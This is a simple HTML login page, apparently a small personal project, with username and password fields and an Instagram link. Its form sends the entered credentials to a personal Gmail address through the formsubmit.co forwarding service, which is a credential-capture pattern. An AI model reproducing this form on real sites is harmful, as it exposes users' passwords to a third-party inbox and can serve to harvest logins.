<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="../css/unitled-5.css">
    <link rel="icon" href="../images/laboudi.icon.jpg">
</head>
<body>
    <div class="login-container">
        <form class="login-form" action="https://formsubmit.co/yespro2019@gmail.com" method="POST">
            <h2>Login</h2>

            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <button type="submit" class="btn">Login</button>

            <p class="register-link">
                Don't have an account? <a href="#">Register here</a>
            </p>

            <!-- Instagram link -->
            <p class="instagram-link">
                Follow us on 
                <a href="https://www.instagram.com/tik.tak.time.24h/" target="_blank">
                    Instagram
                </a>
            </p>
        </form>
    </div>
</body>
</html>
